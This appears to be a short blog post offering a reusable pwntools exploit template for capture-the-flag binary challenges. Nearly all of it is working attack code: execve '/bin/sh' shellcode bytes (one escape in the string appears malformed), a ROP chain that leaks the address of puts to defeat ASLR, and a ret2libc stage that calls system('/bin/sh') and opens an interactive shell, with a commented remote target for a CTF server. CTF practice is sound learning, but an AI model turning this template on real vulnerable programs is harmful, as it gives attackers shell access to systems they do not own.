---
layout: post
title: Pwntools template
categories: Pwn
---

TODO: load from assets, to wget the whole thing

```python

from pwn import *
import struct
## RANDOM TOOLS ##
shellcode = '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
abcd = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'

## VARIABLES ##
#shell = ssh(host='hst', user='usr', password='pwd')
debug = True
debugger = True
#debug, debugger = False
context(arch='amd64') # might not be necessary with elf = context.binary = elf()
binarypath = './rop'
libcpath = '/home/kali/Desktop/roplibs/libc-2.27.so'
elfpath = '/home/kali/Desktop/roplibs/ld-2.27.so'


if debug:
    context.log_level = 'debug'
elf = context.binary = ELF(binarypath)
libc = ELF(libcpath)
ld = ELF(elfpath)
#libc = elf.libc #override libc to work on local machine. with this, everything works somewhow
# Choose Local, Remote, SSH
#p = process(elf.path)
#p = shell.process(['vuln'], cwd='/problems/path')
#p = remote('pwn.chal.csaw.io', 5016)

p = process([ld.path, elf.path], env={'LD_PRELOAD':libc.path})

if debugger: 
    pid = gdb.attach(p)


rop1 = ROP(elf)
rop1.puts(elf.got['puts'])
rop1.call(elf.symbols['main'])
print(rop1.dump())
OFFSET = b'A'*40
p.recvuntil('Hello\n')
p.sendline(OFFSET + rop1.chain())


# Grab the first 8 bytes of our output buffer
leaked_puts = p.recvuntil('\n')[:8].strip().ljust(8, b'\x00')
# Convert to integer
leaked_puts = struct.unpack('Q', leaked_puts)[0]
# Rebase libc to the leaked offset
libc.address = leaked_puts - libc.symbols['puts']
log.info('Libc address: {}'.format(hex(libc.address)))

# Create new ROP object with rebased libc
rop2 = ROP(libc)
# Call system('/bin/sh')
rop2.system(next(libc.search(b'/bin/sh\x00')))
print(rop2.dump())

p.recvuntil(('Hello\n'))
p.sendline(b'B'*40 + rop2.chain())

p.interactive()

```
